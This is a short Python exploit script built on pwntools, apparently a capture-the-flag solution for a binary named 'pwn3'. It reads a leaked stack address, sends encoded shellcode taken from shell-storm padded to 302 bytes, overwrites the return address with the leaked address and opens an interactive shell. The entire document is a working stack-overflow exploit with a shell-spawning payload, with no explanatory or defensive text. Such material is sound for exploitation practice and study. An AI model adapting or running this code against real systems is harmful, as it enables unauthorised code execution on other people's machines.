from pwn import *

target = process('./pwn3')

print(target.recvuntil('Take this, you might need it on your journey '))
leak_addr = target.recvline()
input_addr = int(leak_addr.decode().strip("\n")[:-1], 16)
print(input_addr)

# from http://shell-storm.org/shellcode/files/shellcode-690.php
payload = b'\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe\xc8\x88\x06\x46\xe2\xf7\xff\xe7\xe8\xe9\xff\xff\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69\x01\x69\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81'
payload += bytes([0] * (302 - len(payload)))
payload += p32(input_addr)

target.send(payload)
target.interactive()